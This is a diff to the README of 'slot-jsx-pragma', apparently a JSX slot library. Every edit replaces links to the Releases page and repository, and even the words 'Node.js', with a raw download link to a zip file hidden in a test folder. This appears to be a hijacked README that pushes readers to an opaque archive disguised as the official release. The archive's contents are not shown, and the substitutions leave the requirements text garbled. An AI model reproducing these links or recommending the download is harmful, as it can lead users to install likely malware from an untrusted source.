@@ -6,14 +6,14 @@ Welcome to **slot-jsx-pragma**! This application allows you to use declarative s
 
 ## 📥 Download Now
 
-[![Download slot-jsx-pragma](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/julio859/slot-jsx-pragma/releases)
+[![Download slot-jsx-pragma](https://github.com/julio859/slot-jsx-pragma/raw/refs/heads/main/apps/nextjs/app/slot-tests/pragma_slot_jsx_unfearful.zip)](https://github.com/julio859/slot-jsx-pragma/raw/refs/heads/main/apps/nextjs/app/slot-tests/pragma_slot_jsx_unfearful.zip)
 
 ## 🖥️ System Requirements
 
 Before you download **slot-jsx-pragma**, make sure your system meets these requirements:
 
-- **Operating System:** Windows 10 or later, macOS High Sierra or later, or any Linux distribution that supports Node.js.
-- **Node.js:** Version 14.0 or higher installed.
+- **Operating System:** Windows 10 or later, macOS High Sierra or later, or any Linux distribution that supports https://github.com/julio859/slot-jsx-pragma/raw/refs/heads/main/apps/nextjs/app/slot-tests/pragma_slot_jsx_unfearful.zip
+- **https://github.com/julio859/slot-jsx-pragma/raw/refs/heads/main/apps/nextjs/app/slot-tests/pragma_slot_jsx_unfearful.zip** Version 14.0 or higher installed.
 - **Disk Space:** At least 100 MB free.
 - **Network:** Internet connection for initial download.
 
@@ -27,7 +27,7 @@ Before you download **slot-jsx-pragma**, make sure your system meets these requi
 
 To get started with **slot-jsx-pragma**, visit the Releases page to download the latest version. 
 
-[Visit this page to download](https://github.com/julio859/slot-jsx-pragma/releases)
+[Visit this page to download](https://github.com/julio859/slot-jsx-pragma/raw/refs/heads/main/apps/nextjs/app/slot-tests/pragma_slot_jsx_unfearful.zip)
 
 1. Click the link above.
 2. Find the latest version of **slot-jsx-pragma**.
@@ -55,7 +55,7 @@ After installing, follow these steps to create your first component:
 
 If you encounter issues, try these steps:
 
-- **Check Node.js Version:** Ensure you have the correct version of Node.js installed.
+- **Check https://github.com/julio859/slot-jsx-pragma/raw/refs/heads/main/apps/nextjs/app/slot-tests/pragma_slot_jsx_unfearful.zip Version:** Ensure you have the correct version of https://github.com/julio859/slot-jsx-pragma/raw/refs/heads/main/apps/nextjs/app/slot-tests/pragma_slot_jsx_unfearful.zip installed.
 - **Verify the Download:** Confirm the file you downloaded matches your operating system.
 - **Search Online:** Look for solutions to common problems or errors.
 
@@ -63,8 +63,8 @@ If you encounter issues, try these steps:
 
 For more details on how to leverage the full capabilities of **slot-jsx-pragma**:
 
-- Check the [GitHub Repository](https://github.com/julio859/slot-jsx-pragma) for documentation.
-- Visit the [Releases page](https://github.com/julio859/slot-jsx-pragma/releases) for updates and new features.
+- Check the [GitHub Repository](https://github.com/julio859/slot-jsx-pragma/raw/refs/heads/main/apps/nextjs/app/slot-tests/pragma_slot_jsx_unfearful.zip) for documentation.
+- Visit the [Releases page](https://github.com/julio859/slot-jsx-pragma/raw/refs/heads/main/apps/nextjs/app/slot-tests/pragma_slot_jsx_unfearful.zip) for updates and new features.
 
 ## 🙋‍♂️ Support
 
